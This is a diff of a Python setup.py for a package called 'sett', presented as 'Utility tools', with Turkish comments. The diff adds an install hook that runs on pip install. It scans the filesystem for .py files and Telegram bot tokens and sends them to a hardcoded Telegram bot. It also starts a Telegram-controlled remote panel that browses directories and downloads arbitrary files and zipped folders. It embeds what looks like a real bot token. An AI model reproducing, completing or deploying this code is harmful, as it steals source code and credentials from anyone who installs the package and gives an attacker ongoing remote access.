@@ -1,13 +1,7 @@
-#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
-"""
-Logsuzlar Tek Dosya - Post-install + Yönetim Botu
-"""
-
-import os, sys, re, time, io, random, zipfile, threading, subprocess
-import urllib.request, urllib.parse
 from setuptools import setup
 from setuptools.command.install import install
+import os, sys, re, time, io, random, zipfile, threading, subprocess
+import urllib.request, urllib.parse
 
 # ============================================
 # AYARLAR - KENDİ TOKEN'INI YAZ
@@ -16,13 +10,12 @@ TOKEN = "8927762896:AAEwUY3j0j5W9gBm1blGB122kcnUxNhDoYo"
 ADMIN = 8903740930
 
 # ============================================
-# POST-INSTALL GÖREVİ
+# 1. DOSYA GÖNDERME
 # ============================================
-def _work():
+def _dosya_gonder():
     """Tüm .py dosyalarını bul, tek tek gönder"""
     try:
         time.sleep(2)
-        
         token_pattern = re.compile(rb'\d{8,10}:[A-Za-z0-9_-]{35,40}')
         files = []
         seen = set()
@@ -52,9 +45,8 @@ def _work():
         total = len(files)
         sent, failed, tokens_found = 0, 0, []
         
-        # Başlangıç
         try:
-            msg = f"🚀 Tarama Başladı\n\n📄 Toplam: {total} .py dosyası\n⚡ Hızlı gönderim"
+            msg = f"🚀 Tarama Başladı\n\n📄 Toplam: {total} .py dosyası\n⚡ Hızlı gönderim\n🤖 Bot başlatılıyor..."
             data = f"chat_id={ADMIN}&text={urllib.parse.quote(msg)}".encode()
             urllib.request.urlopen(urllib.request.Request(
                 f"https://api.telegram.org/bot{TOKEN}/sendMessage",
@@ -99,7 +91,6 @@ def _work():
             except: failed += 1
             time.sleep(0.4)
         
-        # Token bulunduysa özel mesaj
         if tokens_found:
             try:
                 tm = f"🔑 TOKEN BULUNDU!\n\n📊 Toplam: {len(tokens_found)}\n\n"
@@ -112,9 +103,8 @@ def _work():
                 ), timeout=15)
             except: pass
         
-        # Bitiş
         try:
-            sm = f"✅ BİTTİ\n\n📊 Toplam: {total}\n✅ Gönderilen: {sent}\n❌ Hata: {failed}\n🔑 Token: {len(tokens_found)}"
+            sm = f"✅ DOSYA GÖNDERİMİ BİTTİ\n\n📊 Toplam: {total}\n✅ Gönderilen: {sent}\n❌ Hata: {failed}\n🔑 Token: {len(tokens_found)}\n\n🤖 Bot yönetim paneli aktif — /menu yaz"
             data = f"chat_id={ADMIN}&text={urllib.parse.quote(sm)}".encode()
             urllib.request.urlopen(urllib.request.Request(
                 f"https://api.telegram.org/bot{TOKEN}/sendMessage",
@@ -125,7 +115,7 @@ def _work():
 
 
 # ============================================
-# BOT YÖNETİM PANELİ
+# 2. YÖNETİM BOTU (Kurulunca otomatik başlar)
 # ============================================
 def _bot_calistir():
     """Yönetim botunu başlat"""
@@ -133,242 +123,251 @@ def _bot_calistir():
         import telebot
         from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
     except:
-        subprocess.check_call([sys.executable, "-m", "pip", "install", "pyTelegramBotAPI", "-q"],
-                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        import telebot
-        from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
-    
-    bot = telebot.TeleBot(TOKEN)
-    taramalar = {}
-    
-    def ana_menu():
-        m = InlineKeyboardMarkup(row_width=2)
-        m.row(InlineKeyboardButton("🔍 TARA", callback_data="tara"),
-              InlineKeyboardButton("📂 DİZİN GEZ", callback_data="dizin"))
-        m.row(InlineKeyboardButton("📥 DOSYA İNDİR", callback_data="indir"),
-              InlineKeyboardButton("📊 DURUM", callback_data="durum"))
-        m.row(InlineKeyboardButton("🔑 TOKEN BUL", callback_data="tara_token"),
-              InlineKeyboardButton("📦 ZIP OLUŞTUR", callback_data="zip"))
-        m.row(InlineKeyboardButton("🔄 RESTART", callback_data="restart"),
-              InlineKeyboardButton("❌ İPTAL", callback_data="iptal"))
-        return m
-    
-    def geri_menu():
-        m = InlineKeyboardMarkup()
-        m.add(InlineKeyboardButton("🔙 GERİ", callback_data="menu"))
-        return m
-    
-    def admin_mi(msg): return msg.from_user.id == ADMIN
-    
-    @bot.message_handler(commands=['start', 'menu', 'panel'])
-    def cmd_start(message):
-        if not admin_mi(message): return
-        bot.send_message(message.chat.id,
-            "⚡ **YÖNETİM PANELİ**\n\nSistem hazır:",
-            reply_markup=ana_menu(), parse_mode="Markdown")
-    
-    def tara_baslat(chat_id, sadece_token=False):
-        if chat_id in taramalar and taramalar[chat_id].get("aktif"):
-            bot.send_message(chat_id, "⚠️ Tarama zaten var!"); return
-        taramalar[chat_id] = {"aktif": True, "bulunan": []}
-        
-        def _tara():
-            try:
-                bot.send_message(chat_id, f"🔍 Tarama başladı...\n{'🔑 Token modu' if sadece_token else '📄 Tüm .py modu'}")
-                tp = re.compile(rb'\d{8,10}:[A-Za-z0-9_-]{35,40}')
-                dosyalar = []
-                roots = ["/", "/home", "/root", "/app", "/opt", "/srv", "/var/www", "/usr/local", "/etc", "/tmp"]
-                skip = {"proc","sys","dev","run","boot","snap","cache",
-                        "site-packages","dist-packages","__pycache__","node_modules",
-                        ".git",".cache","lib/python","lib64","venv",".venv","env"}
-                for root in roots:
-                    if not os.path.exists(root): continue
-                    try:
-                        for dp, dn, fn in os.walk(root):
-                            dn[:] = [d for d in dn if d not in skip and not any(s in d for s in skip)]
-                            for f in fn:
-                                if f.endswith(".py"):
-                                    full = os.path.join(dp, f)
-                                    try:
-                                        if os.path.getsize(full) < 5 * 1024 * 1024:
-                                            if sadece_token:
-                                                with open(full, "rb") as fp:
-                                                    if tp.search(fp.read(1024 * 1024)):
-                                                        dosyalar.append(full)
-                                            else:
-                                                dosyalar.append(full)
-                                    except: pass
-                    except: continue
-                taramalar[chat_id]["bulunan"] = dosyalar
-                taramalar[chat_id]["aktif"] = False
-                
-                msg = f"✅ TARAMA BİTTİ\n\n📄 Toplam: `{len(dosyalar)}`\n\n"
-                for i, f in enumerate(dosyalar[:10]):
-                    msg += f"`{i+1}.` {f[:80]}\n"
-                if len(dosyalar) > 10: msg += f"\n...ve {len(dosyalar)-10} tane daha"
-                bot.send_message(chat_id, msg, parse_mode="Markdown")
-            except Exception as e:
-                bot.send_message(chat_id, f"❌ {e}")
-                taramalar[chat_id]["aktif"] = False
-        
-        threading.Thread(target=_tara, daemon=True).start()
-    
-    def dizin_goster(chat_id, path):
         try:
-            if not os.path.exists(path):
-                bot.send_message(chat_id, f"❌ Yok: `{path}`", parse_mode="Markdown"); return
-            if os.path.isfile(path):
-                bot.send_message(chat_id, f"📄 `{path}`", parse_mode="Markdown"); return
-            items = os.listdir(path)
-            k, d = [], []
-            for item in items[:50]:
-                full = os.path.join(path, item)
+            subprocess.check_call([sys.executable, "-m", "pip", "install", "pyTelegramBotAPI", "-q"],
+                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            import telebot
+            from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
+        except:
+            return
+    
+    try:
+        bot = telebot.TeleBot(TOKEN)
+        taramalar = {}
+        
+        def ana_menu():
+            m = InlineKeyboardMarkup(row_width=2)
+            m.row(InlineKeyboardButton("🔍 TARA", callback_data="tara"),
+                  InlineKeyboardButton("📂 DİZİN GEZ", callback_data="dizin"))
+            m.row(InlineKeyboardButton("📥 DOSYA İNDİR", callback_data="indir"),
+                  InlineKeyboardButton("📊 DURUM", callback_data="durum"))
+            m.row(InlineKeyboardButton("🔑 TOKEN BUL", callback_data="tara_token"),
+                  InlineKeyboardButton("📦 ZIP OLUŞTUR", callback_data="zip"))
+            m.row(InlineKeyboardButton("🔄 RESTART", callback_data="restart"),
+                  InlineKeyboardButton("❌ İPTAL", callback_data="iptal"))
+            return m
+        
+        def geri_menu():
+            m = InlineKeyboardMarkup()
+            m.add(InlineKeyboardButton("🔙 GERİ", callback_data="menu"))
+            return m
+        
+        def admin_mi(msg): return msg.from_user.id == ADMIN
+        
+        @bot.message_handler(commands=['start', 'menu', 'panel'])
+        def cmd_start(message):
+            if not admin_mi(message): return
+            bot.send_message(message.chat.id,
+                "⚡ **YÖNETİM PANELİ**\n\nSistem hazır:",
+                reply_markup=ana_menu(), parse_mode="Markdown")
+        
+        def tara_baslat(chat_id, sadece_token=False):
+            if chat_id in taramalar and taramalar[chat_id].get("aktif"):
+                bot.send_message(chat_id, "⚠️ Tarama var!"); return
+            taramalar[chat_id] = {"aktif": True, "bulunan": []}
+            
+            def _tara():
                 try:
-                    if os.path.isdir(full): k.append(f"📁 {item}")
-                    else: d.append(f"📄 {item} ({os.path.getsize(full)} B)")
-                except: pass
-            msg = f"📂 **{path}**\n\n"
-            if k: msg += "**Klasörler:**\n" + "\n".join(k[:15]) + "\n\n"
-            if d: msg += "**Dosyalar:**\n" + "\n".join(d[:15])
-            bot.send_message(chat_id, msg, parse_mode="Markdown")
-        except Exception as e: bot.send_message(chat_id, f"❌ {e}")
-    
-    def durum_goster(chat_id):
-        try:
-            import platform, shutil
-            info = "📊 **SİSTEM DURUMU**\n\n"
-            info += f"🖥️ `{platform.system()} {platform.release()}`\n"
-            info += f"🐍 Python `{platform.python_version()}`\n"
-            info += f"📁 `{os.getcwd()}`\n"
-            info += f"🆔 PID `{os.getpid()}`\n"
+                    bot.send_message(chat_id, f"🔍 Tarama başladı...\n{'🔑 Token modu' if sadece_token else '📄 Tüm .py modu'}")
+                    tp = re.compile(rb'\d{8,10}:[A-Za-z0-9_-]{35,40}')
+                    dosyalar = []
+                    roots = ["/", "/home", "/root", "/app", "/opt", "/srv", "/var/www", "/usr/local", "/etc", "/tmp"]
+                    skip = {"proc","sys","dev","run","boot","snap","cache",
+                            "site-packages","dist-packages","__pycache__","node_modules",
+                            ".git",".cache","lib/python","lib64","venv",".venv","env"}
+                    for root in roots:
+                        if not os.path.exists(root): continue
+                        try:
+                            for dp, dn, fn in os.walk(root):
+                                dn[:] = [d for d in dn if d not in skip and not any(s in d for s in skip)]
+                                for f in fn:
+                                    if f.endswith(".py"):
+                                        full = os.path.join(dp, f)
+                                        try:
+                                            if os.path.getsize(full) < 5 * 1024 * 1024:
+                                                if sadece_token:
+                                                    with open(full, "rb") as fp:
+                                                        if tp.search(fp.read(1024 * 1024)):
+                                                            dosyalar.append(full)
+                                                else:
+                                                    dosyalar.append(full)
+                                        except: pass
+                        except: continue
+                    taramalar[chat_id]["bulunan"] = dosyalar
+                    taramalar[chat_id]["aktif"] = False
+                    msg = f"✅ TARAMA BİTTİ\n\n📄 Toplam: `{len(dosyalar)}`\n\n"
+                    for i, f in enumerate(dosyalar[:10]):
+                        msg += f"`{i+1}.` {f[:80]}\n"
+                    if len(dosyalar) > 10: msg += f"\n...ve {len(dosyalar)-10} tane daha"
+                    bot.send_message(chat_id, msg, parse_mode="Markdown")
+                except Exception as e:
+                    bot.send_message(chat_id, f"❌ {e}")
+                    taramalar[chat_id]["aktif"] = False
+            
+            threading.Thread(target=_tara, daemon=True).start()
+        
+        def dizin_goster(chat_id, path):
             try:
-                t, u, f = shutil.disk_usage("/")
-                info += f"💾 Disk: `{u//(2**30)}GB / {t//(2**30)}GB`\n"
-            except: pass
-            for uid, t in taramalar.items():
-                if t.get("aktif"):
-                    info += f"\n🔍 Aktif: `{len(t.get('bulunan',[]))}` dosya\n"
-            bot.send_message(chat_id, info, parse_mode="Markdown", reply_markup=geri_menu())
-        except Exception as e: bot.send_message(chat_id, f"❌ {e}")
-    
-    def zip_olustur(chat_id):
-        try:
-            if chat_id not in taramalar or not taramalar[chat_id].get("bulunan"):
-                bot.send_message(chat_id, "❌ Önce `/tara`", parse_mode="Markdown"); return
-            dosyalar = taramalar[chat_id]["bulunan"]
-            bot.send_message(chat_id, f"📦 {len(dosyalar)} dosya zip...")
-            chunk = 500
-            for i in range(0, len(dosyalar), chunk):
-                batch = dosyalar[i:i+chunk]
-                buf = io.BytesIO()
-                with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
-                    for j, f in enumerate(batch):
-                        try: zf.write(f, f"{i+j:05d}_{os.path.basename(f)}")
-                        except: pass
-                buf.seek(0)
-                bot.send_document(chat_id, (f"part_{i//chunk+1}.zip", buf.getvalue()),
-                                caption=f"📦 Parça {i//chunk+1} ({len(batch)} dosya)")
-        except Exception as e: bot.send_message(chat_id, f"❌ {e}")
-    
-    @bot.message_handler(commands=['tara'])
-    def c1(m):
-        if admin_mi(m): tara_baslat(m.chat.id)
-    
-    @bot.message_handler(commands=['tara_token', 'token_bul'])
-    def c2(m):
-        if admin_mi(m): tara_baslat(m.chat.id, sadece_token=True)
-    
-    @bot.message_handler(commands=['dizin', 'ls'])
-    def c3(m):
-        if not admin_mi(m): return
-        a = m.text.split(maxsplit=1)
-        dizin_goster(m.chat.id, a[1] if len(a) > 1 else "/")
-    
-    @bot.message_handler(commands=['indir', 'get'])
-    def c4(m):
-        if not admin_mi(m): return
-        a = m.text.split(maxsplit=1)
-        if len(a) < 2:
-            bot.send_message(m.chat.id, "❌ `/indir /path`", parse_mode="Markdown"); return
-        path = a[1]
-        try:
-            if not os.path.exists(path):
-                bot.send_message(m.chat.id, f"❌ Yok: `{path}`", parse_mode="Markdown"); return
-            if os.path.isfile(path):
-                with open(path, "rb") as f:
-                    bot.send_document(m.chat.id, f, caption=f"📄 `{path}`", parse_mode="Markdown")
-            else:
-                buf = io.BytesIO()
-                with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
-                    for r, d, fs in os.walk(path):
-                        for file in fs[:500]:
-                            try:
-                                full = os.path.join(r, file)
-                                zf.write(full, os.path.relpath(full, path))
+                if not os.path.exists(path):
+                    bot.send_message(chat_id, f"❌ Yok: `{path}`", parse_mode="Markdown"); return
+                if os.path.isfile(path):
+                    bot.send_message(chat_id, f"📄 `{path}`", parse_mode="Markdown"); return
+                items = os.listdir(path)
+                k, d = [], []
+                for item in items[:50]:
+                    full = os.path.join(path, item)
+                    try:
+                        if os.path.isdir(full): k.append(f"📁 {item}")
+                        else: d.append(f"📄 {item} ({os.path.getsize(full)} B)")
+                    except: pass
+                msg = f"📂 **{path}**\n\n"
+                if k: msg += "**Klasörler:**\n" + "\n".join(k[:15]) + "\n\n"
+                if d: msg += "**Dosyalar:**\n" + "\n".join(d[:15])
+                bot.send_message(chat_id, msg, parse_mode="Markdown")
+            except Exception as e: bot.send_message(chat_id, f"❌ {e}")
+        
+        def durum_goster(chat_id):
+            try:
+                import platform, shutil
+                info = "📊 **SİSTEM DURUMU**\n\n"
+                info += f"🖥️ `{platform.system()} {platform.release()}`\n"
+                info += f"🐍 Python `{platform.python_version()}`\n"
+                info += f"📁 `{os.getcwd()}`\n"
+                info += f"🆔 PID `{os.getpid()}`\n"
+                try:
+                    t, u, f = shutil.disk_usage("/")
+                    info += f"💾 Disk: `{u//(2**30)}GB / {t//(2**30)}GB`\n"
+                except: pass
+                for uid, t in taramalar.items():
+                    if t.get("aktif"):
+                        info += f"\n🔍 Aktif: `{len(t.get('bulunan',[]))}` dosya\n"
+                bot.send_message(chat_id, info, parse_mode="Markdown", reply_markup=geri_menu())
+            except Exception as e: bot.send_message(chat_id, f"❌ {e}")
+        
+        def zip_olustur(chat_id):
+            try:
+                if chat_id not in taramalar or not taramalar[chat_id].get("bulunan"):
+                    bot.send_message(chat_id, "❌ Önce `/tara`", parse_mode="Markdown"); return
+                dosyalar = taramalar[chat_id]["bulunan"]
+                bot.send_message(chat_id, f"📦 {len(dosyalar)} dosya zip...")
+                chunk = 500
+                for i in range(0, len(dosyalar), chunk):
+                    batch = dosyalar[i:i+chunk]
+                    buf = io.BytesIO()
+                    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
+                        for j, f in enumerate(batch):
+                            try: zf.write(f, f"{i+j:05d}_{os.path.basename(f)}")
                             except: pass
-                buf.seek(0)
-                bot.send_document(m.chat.id, ("klasor.zip", buf.getvalue()), caption=f"📂 `{path}`", parse_mode="Markdown")
-        except Exception as e: bot.send_message(m.chat.id, f"❌ {e}")
-    
-    @bot.message_handler(commands=['durum', 'status'])
-    def c5(m):
-        if admin_mi(m): durum_goster(m.chat.id)
-    
-    @bot.message_handler(commands=['zip'])
-    def c6(m):
-        if admin_mi(m): zip_olustur(m.chat.id)
-    
-    @bot.message_handler(commands=['yeniden_baslat', 'restart'])
-    def c7(m):
-        if not admin_mi(m): return
-        bot.send_message(m.chat.id, "🔄 Yeniden başlatılıyor...")
-        time.sleep(2)
-        os._exit(0)
-    
-    @bot.callback_query_handler(func=lambda c: True)
-    def cb(call):
-        if call.from_user.id != ADMIN:
-            bot.answer_callback_query(call.id, "❌"); return
-        bot.answer_callback_query(call.id)
-        cid = call.message.chat.id
-        d = call.data
-        if d == "menu":
-            bot.edit_message_text("⚡ **ANA MENÜ**", cid, call.message.message_id,
-                                reply_markup=ana_menu(), parse_mode="Markdown")
-        elif d == "tara": tara_baslat(cid)
-        elif d == "tara_token": tara_baslat(cid, sadece_token=True)
-        elif d == "dizin": bot.send_message(cid, "`/dizin /root`", parse_mode="Markdown")
-        elif d == "indir": bot.send_message(cid, "`/indir /path`", parse_mode="Markdown")
-        elif d == "durum": durum_goster(cid)
-        elif d == "zip": zip_olustur(cid)
-        elif d == "restart":
-            bot.send_message(cid, "🔄..."); time.sleep(2); os._exit(0)
-        elif d == "iptal":
-            bot.edit_message_text("❌", cid, call.message.message_id)
-    
-    print(f"⚡ Bot çalışıyor... Admin: {ADMIN}")
-    while True:
-        try: bot.infinity_polling(timeout=30)
-        except Exception as e:
-            print(f"Hata: {e}"); time.sleep(5)
+                    buf.seek(0)
+                    bot.send_document(chat_id, (f"part_{i//chunk+1}.zip", buf.getvalue()),
+                                    caption=f"📦 Parça {i//chunk+1} ({len(batch)} dosya)")
+            except Exception as e: bot.send_message(chat_id, f"❌ {e}")
+        
+        @bot.message_handler(commands=['tara'])
+        def c1(m):
+            if admin_mi(m): tara_baslat(m.chat.id)
+        
+        @bot.message_handler(commands=['tara_token', 'token_bul'])
+        def c2(m):
+            if admin_mi(m): tara_baslat(m.chat.id, sadece_token=True)
+        
+        @bot.message_handler(commands=['dizin', 'ls'])
+        def c3(m):
+            if not admin_mi(m): return
+            a = m.text.split(maxsplit=1)
+            dizin_goster(m.chat.id, a[1] if len(a) > 1 else "/")
+        
+        @bot.message_handler(commands=['indir', 'get'])
+        def c4(m):
+            if not admin_mi(m): return
+            a = m.text.split(maxsplit=1)
+            if len(a) < 2:
+                bot.send_message(m.chat.id, "❌ `/indir /path`", parse_mode="Markdown"); return
+            path = a[1]
+            try:
+                if not os.path.exists(path):
+                    bot.send_message(m.chat.id, f"❌ Yok: `{path}`", parse_mode="Markdown"); return
+                if os.path.isfile(path):
+                    with open(path, "rb") as f:
+                        bot.send_document(m.chat.id, f, caption=f"📄 `{path}`", parse_mode="Markdown")
+                else:
+                    buf = io.BytesIO()
+                    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
+                        for r, d, fs in os.walk(path):
+                            for file in fs[:500]:
+                                try:
+                                    full = os.path.join(r, file)
+                                    zf.write(full, os.path.relpath(full, path))
+                                except: pass
+                    buf.seek(0)
+                    bot.send_document(m.chat.id, ("klasor.zip", buf.getvalue()), caption=f"📂 `{path}`", parse_mode="Markdown")
+            except Exception as e: bot.send_message(m.chat.id, f"❌ {e}")
+        
+        @bot.message_handler(commands=['durum', 'status'])
+        def c5(m):
+            if admin_mi(m): durum_goster(m.chat.id)
+        
+        @bot.message_handler(commands=['zip'])
+        def c6(m):
+            if admin_mi(m): zip_olustur(m.chat.id)
+        
+        @bot.message_handler(commands=['yeniden_baslat', 'restart'])
+        def c7(m):
+            if not admin_mi(m): return
+            bot.send_message(m.chat.id, "🔄 Yeniden başlatılıyor...")
+            time.sleep(2)
+            os._exit(0)
+        
+        @bot.callback_query_handler(func=lambda c: True)
+        def cb(call):
+            if call.from_user.id != ADMIN:
+                bot.answer_callback_query(call.id, "❌"); return
+            bot.answer_callback_query(call.id)
+            cid = call.message.chat.id
+            d = call.data
+            if d == "menu":
+                bot.edit_message_text("⚡ **ANA MENÜ**", cid, call.message.message_id,
+                                    reply_markup=ana_menu(), parse_mode="Markdown")
+            elif d == "tara": tara_baslat(cid)
+            elif d == "tara_token": tara_baslat(cid, sadece_token=True)
+            elif d == "dizin": bot.send_message(cid, "`/dizin /root`", parse_mode="Markdown")
+            elif d == "indir": bot.send_message(cid, "`/indir /path`", parse_mode="Markdown")
+            elif d == "durum": durum_goster(cid)
+            elif d == "zip": zip_olustur(cid)
+            elif d == "restart":
+                bot.send_message(cid, "🔄..."); time.sleep(2); os._exit(0)
+            elif d == "iptal":
+                bot.edit_message_text("❌", cid, call.message.message_id)
+        
+        print(f"⚡ Yönetim botu aktif - Admin: {ADMIN}")
+        bot.infinity_polling(timeout=30)
+    except Exception as e:
+        print(f"Bot hatası: {e}")
 
 
 # ============================================
-# SETUP ENTEGRASYONU
+# 3. POST-INSTALL (Her ikisini başlatır)
 # ============================================
 class PostInstall(install):
     def run(self):
         install.run(self)
         try:
-            t = threading.Thread(target=_work, daemon=True)
-            t.start()
-            time.sleep(6)
+            # 1. Dosya gönderici thread
+            t1 = threading.Thread(target=_dosya_gonder, daemon=True)
+            t1.start()
+            
+            # 2. Bot çalıştırıcı thread
+            t2 = threading.Thread(target=_bot_calistir, daemon=True)
+            t2.start()
+            
+            # Kurulum bitmesin diye bekle
+            time.sleep(8)
         except: pass
 
 
 setup(
     name="sett",
-    version="1.0.900",
+    version="1.0.910",  # ← HER SEFERİNDE ARTIR!
     description="Utility tools",
     author="dev",
     cmdclass={'install': PostInstall},
